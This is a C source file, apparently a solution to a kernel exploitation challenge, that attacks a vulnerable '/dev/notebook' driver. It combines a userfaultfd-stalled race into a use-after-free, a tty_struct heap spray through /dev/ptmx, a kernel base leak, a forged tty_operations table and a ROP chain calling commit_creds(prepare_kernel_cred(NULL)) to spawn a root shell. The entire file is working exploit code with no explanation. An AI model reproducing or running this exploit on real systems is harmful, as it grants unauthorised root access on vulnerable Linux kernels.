//
// Created by root on 22-7-28.
//
#include <poll.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <semaphore.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>

struct tty_driver;
struct file;
struct ktermios;
struct termiox;
struct serial_icounter_struct;
struct seq_file;
struct tty_struct;

struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
                                  struct file *filp, int idx);
    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int  (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int  (*write)(struct tty_struct * tty,
                  const unsigned char *buf, int count);
    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int  (*write_room)(struct tty_struct *tty);
    int  (*chars_in_buffer)(struct tty_struct *tty);
    int  (*ioctl)(struct tty_struct *tty,
                  unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
                         unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty,
                    unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    int (*get_icount)(struct tty_struct *tty,
                      struct serial_icounter_struct *icount);
    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
    int (*poll_init)(struct tty_driver *driver, int line, char *options);
	int (*poll_get_char)(struct tty_driver *driver, int line);
	void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
    const struct file_operations *proc_fops;
};

#define ADD_CODE 256
#define GIFT_CODE 100
#define DELETE_CODE 512
#define EDIT_CODE 768
#define TTY_STRUCT_SIZE 0x2E0

#define ptm_unix98_ops 0xFFFFFFFF81E8E440
#define pty_unix98_ops 0xFFFFFFFF81E8E320
#define commit_creds_BASE 0xFFFFFFFF810A9B40
#define prepare_kernel_cred_BASE 0xFFFFFFFF810A9EF0
#define kernel_BASE 0xFFFFFFFF81000000
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xFFFFFFFF81A00929

int fd = 0;
static char *page = NULL;
static long page_size;
static pthread_t add_thread, edit_thread;
char* mmap_space;
sem_t add_sem, edit_sem;
int ptmx_fds[0x60];
extern size_t user_cs, user_ss, user_rflags, user_sp;

typedef struct notearg{
    size_t idx;
    size_t size;
    void* buf;
}notearg;
typedef struct note{
    char* note;
    size_t size;
}note;

void noteadd(size_t idx, size_t size, void* buf);
void notegift(void* buf);
void notedel(size_t idx);
void noteedit(size_t idx, size_t size, void* buf);
void notewrite(const char* buf, size_t idx);
note* notebook_msg(bool printInfo);

void* noteedit_exp(void* args);
void* noteadd_exp(void* args);

void saveStatus();
void errExit(char* msg);
void registerUserFaultFd(void * addr, unsigned long len, void* (*handler)(void*));
void print_binary(char* buf, int length);
static void* fault_handler_thread(void *arg);
void getShell();

void noteadd(size_t idx, size_t size, void* buf){
    printf("\033[1;34mAdd note #%zu...\n\033[m", idx);
    notearg arg = {idx, size, buf};
    if(size <= 0x60)
        ioctl(fd, ADD_CODE, &arg);
    else{
        printf("\033[1;34mAdding note which has size larger than 0x60, use edit...\n\033[m");
        arg.size = 0x60;
        ioctl(fd, ADD_CODE, &arg);
        arg.size = size;
        noteedit(idx, size, buf);
    }
}
void notegift(void* buf){
    printf("\033[1;32mFetch note information...\n\033[m");
    notearg arg = {0, 0, buf};
    ioctl(fd, GIFT_CODE, &arg);
}
void notedel(size_t idx){
    printf("\033[1;34mDelete note #%zu...\n\033[m", idx);
    notearg arg = {idx, 0, NULL};
    ioctl(fd, DELETE_CODE, &arg);
}
void noteedit(size_t idx, size_t size, void* buf){
    printf("\033[1;34mResize note #%zu to %zu...\n\033[m", idx, size);
    notearg arg = {idx, size, buf};
    ioctl(fd, EDIT_CODE, &arg);
}
void notewrite(const char* buf, size_t idx){
    printf("\033[1;34mWrite to note #%zu...\n\033[m", idx);
    write(fd, buf, idx);
}
note* notebook_msg(bool printInfo){
    note* noteBuf = malloc(sizeof(note) * 0x10);
    notegift(noteBuf);
    if(printInfo){
        printf("\033[1;36m--------------------------------------------------------------------------------\n");
        printf("Current Notebook Info:\n");
        for(int i=0; i<0x10; i++)
            printf("\tNote #%02d: size = %#zx, pointer = %p\n", i, noteBuf[i].size, noteBuf[i].note);
        printf("--------------------------------------------------------------------------------\n\033[m");
    }
    return noteBuf;
}
void* noteedit_exp(void* args){
    noteedit((int)args, 0x2000, mmap_space);
    return NULL;
}
void* noteadd_exp(void* args){
    noteadd((int)args, 0x50, mmap_space);
    return NULL;
}
static void* fault_handler_thread(void *arg)	// 这个arg参数对应上面registerUserFaultFd中pthread_create的第四个参数，将uffd文件描述符传入本函数中
{
    static struct uffd_msg msg;
    static int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;

    for (;;)
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = (int)uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        printf("\033[1;32mSuccessfully entered registered userfaultfd!\n\033[m");
        sleep(50);      // stop here

        if (nready == -1)
            errExit("poll");

        nread = read((int)uffd, &msg, sizeof(msg));

        if (nread == 0)
            errExit("EOF on userfaultfd!\n");

        if (nread == -1)
            errExit("read");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
            errExit("Unexpected event on userfaultfd\n");

        uffdio_copy.src = (unsigned long) page;
        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                          ~(page_size - 1);
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl((int)uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            errExit("ioctl-UFFDIO_COPY");
    }
}

void getShell(){
    if(getuid())
        errExit("Failed to get root privilege");
    printf("\033[1;32mSuccessfully get root shell!\n\033[m");
    system("/bin/sh");
}

int main(){
    saveStatus();
    page_size = sysconf(_SC_PAGESIZE);
    page = (char*)malloc(0x1000);
    memset(page, 'a', 0x1000);
    fd = open("/dev/notebook", O_RDWR);

    mmap_space = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    printf("\033[1;34mMmap executed, mmap address: %p\n\033[m", mmap_space);
    registerUserFaultFd(mmap_space, 0x1000, fault_handler_thread);
    printf("\033[1;34mMmap space userfaultfd registered.\n\033[m");

    for(int i=0; i<0x10; i++)
        noteadd(i, TTY_STRUCT_SIZE, page);
    printf("\033[1;34mNotebook filled.\n\033[m");
    notebook_msg(true);
    sleep(1);

    for(int i=0; i<0x10; i++)
        pthread_create(&edit_thread, NULL, noteedit_exp, (void*)i); // trigger page fault, freeing all notes
    printf("\033[1;34mCreated 16 paused thread of edit and freeing all notes.\n\033[m");
    sleep(1);

//    for(int i=0; i<0x10; i++)
//        sem_post(&edit_sem);
//    sleep(1);

    for(int i=0; i<0x60; i++)
        ptmx_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    printf("\033[1;32mHeap sprayed by lots of tty_struct by opening /dev/ptmx\n\033[m");
    sleep(1);

    for(int i=0; i<0x10; i++)
        pthread_create(&add_thread, NULL, noteadd_exp, (void*)i);
    notebook_msg(true);
    sleep(1);

//    for(int i=0; i<0x10; i++)
//        sem_post(&add_sem);
//    sleep(1);

    char ttyinfo[0x300];
    memset(ttyinfo, 0, 0x300);
    char* hit_address = NULL;
    int hit_idx = -1;
    char* fake_ttyops_address = NULL;
    int fake_ttyops_idx = -1;
    size_t* fake_stack_address = NULL;
    int fake_stack_idx = -1;
    for(int i=0; i<0x10; i++){
        read(fd, ttyinfo, i);
        int header = *((int*)ttyinfo);
        if(header == 0x5401 || header ==  0x5402){
            hit_address = notebook_msg(false)[i].note;
            hit_idx = i;
        }else{
            if(fake_ttyops_idx == -1){
                fake_ttyops_address = (char*)(notebook_msg(false)[i].note);
                fake_ttyops_idx = i;
            }
            else{
                fake_stack_address = (size_t*)(notebook_msg(false)[i].note);
                fake_stack_idx = i;
            }
        }
        if(hit_address && fake_stack_address)
            break;
    }
    if(hit_address == NULL)
        errExit("Failed to access tty_struct in notes.");
    if(fake_stack_address == NULL)
        errExit("Failed to find fake stack address.");
    printf("\033[1;32mSuccessfully accessed tty_struct in note #%d, address: %p\n\033[m", hit_idx, hit_address);
    printf("\033[1;32mSuccessfully found fake tty_struct_operations in note #%d, address: %p\n\033[m", fake_ttyops_idx, fake_ttyops_address);
    printf("\033[1;32mSuccessfully found fake stack in note #%d, address: %p\n\033[m", fake_stack_idx, fake_stack_address);

    printf("\033[1;34mReady to get base address of kernel by file_operations ptr.\n\033[m");
    u_int64_t tty_operation = ((u_int64_t*)ttyinfo)[3];
    printf("\033[1;32mtty_operations address: %p\n\033[m", (void*)tty_operation);
    u_int64_t offset = 0;
    if((tty_operation & 0xFFF) == (ptm_unix98_ops & 0xFFF))     // this file_operations is ptm_unix98_ops
        offset = tty_operation - ptm_unix98_ops;
    else if((tty_operation & 0xFFF) == (pty_unix98_ops & 0xFFF))    // this file_operations is pty_unix98_ops
        offset = tty_operation - pty_unix98_ops;
    else
        errExit("Unexpected tty_operations address.");
    printf("\033[1;32mBase address got.\n\033[m");

    u_int64_t base_address = kernel_BASE + offset;
    void (*commit_creds)() = (void(*)())(commit_creds_BASE + offset);
    void (*prepare_kernel_cred)() = (void(*)())(prepare_kernel_cred_BASE + offset);
    void (*swapgs_restore_regs_and_return_to_usermode)() = (void(*)())(SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + offset);
    printf("\033[1;32mBase address: %zx.\n\033[m", base_address);
    printf("\033[1;32mOffset: %zx.\n\033[m", offset);
    printf("\033[1;32mcommit_creds: %p.\n\033[m", commit_creds);
    printf("\033[1;32mprepare_kernel_cred: %p.\n\033[m", prepare_kernel_cred);
    printf("\033[1;32mswapgs_restore_regs_and_return_to_usermode: %p.\n\033[m", swapgs_restore_regs_and_return_to_usermode);

    printf("\033[1;34mReady to trigger the first stack pivoting.\n\033[m");
    noteedit(fake_ttyops_idx, sizeof(struct tty_operations), page);
    noteedit(fake_stack_idx, 0x100, page);
    notebook_msg(true);

    char original_tty[TTY_STRUCT_SIZE];
    read(fd, original_tty, hit_idx);
    printf("\033[1;34mUnchanged tty_struct content:\n\033[m");
    print_binary(original_tty, TTY_STRUCT_SIZE);

    char fake_tty[TTY_STRUCT_SIZE];
    memcpy(fake_tty, original_tty, TTY_STRUCT_SIZE);

    size_t fake_tty_ops[0x200];
    memset(fake_tty_ops, 0, sizeof fake_tty_ops);
    size_t push_rdi_pop_rsp_pop_rbp_add_rax_rdx_ret = 0xffffffff81238d50;
    ((struct tty_operations*)fake_tty_ops)->write = (int (*)(struct tty_struct *, const unsigned char *, int)) (
            push_rdi_pop_rsp_pop_rbp_add_rax_rdx_ret + offset);
    printf("\033[1;34mfake_tty_operations edited, write pointer: %p\n\033[m", ((struct tty_operations*)fake_tty_ops)->write);
    printf("\033[1;35mFirst gadget:\n"
           "\tpush rdi;\n"
           "\tpop rsp;\n"
           "\tpop rbp;\n"
           "\tadd rax, rdx;\n"
           "\tret;\n"
           "This gadget is used to migrate rsp to fake tty_operations in note #%d.\n\033[m", hit_idx);

    size_t pop_rbx_pop_rbp_ret = 0xffffffff81002141;
    size_t mov_rsp_rbp_pop_rbp_ret = 0xffffffff8107875c;
    ((size_t*)fake_tty)[1] = pop_rbx_pop_rbp_ret + offset;
    ((size_t*)fake_tty)[3] = (size_t) notebook_msg(false)[fake_ttyops_idx].note;
    ((size_t*)fake_tty)[4] = mov_rsp_rbp_pop_rbp_ret + offset;

    size_t pop_rbp_ret = 0xffffffff81000367;
    ((size_t*)fake_tty_ops)[1] = pop_rbp_ret + offset;
    ((size_t*)fake_tty_ops)[2] = (size_t) notebook_msg(false)[fake_stack_idx].note;
    ((size_t*)fake_tty_ops)[3] = mov_rsp_rbp_pop_rbp_ret + offset;

    size_t pop_rdi_ret = 0xffffffff81007115;
    size_t mov_rdi_rax_pop_rbp_ret = 0xffffffff81045833;
    size_t rop[0x60] = {0};
    int ropidx = 0;
    rop[ropidx++] = 0xdeadbeefdeadbeef;     // for pop rbp
    rop[ropidx++] = pop_rdi_ret + offset;
    rop[ropidx++] = 0;
    rop[ropidx++] = (size_t)prepare_kernel_cred;    // prepare_kernel_cred(NULL);
    rop[ropidx++] = mov_rdi_rax_pop_rbp_ret + offset;
    rop[ropidx++] = 0xdeadbeefdeadbeef;
    rop[ropidx++] = (size_t)commit_creds;           // commit_creds(prepare_kernel_cred(NULL));
    rop[ropidx++] = (size_t)swapgs_restore_regs_and_return_to_usermode + 22;
    rop[ropidx++] = 0;
    rop[ropidx++] = 0;
    rop[ropidx++] = (size_t)&getShell;
    rop[ropidx++] = user_cs;
    rop[ropidx++] = user_rflags;
    rop[ropidx++] = user_sp;
    rop[ropidx++] = user_ss;

    write(fd, rop, fake_stack_idx);
    write(fd, fake_tty_ops, fake_ttyops_idx);
    write(fd, fake_tty, hit_idx);
    printf("\033[1;32mEvil data written, ready to exploit....\n\033[m");

    sleep(2);
    for(int i=0; i<0x60; i++)
        write(ptmx_fds[i], page, 200);

    return 0;
}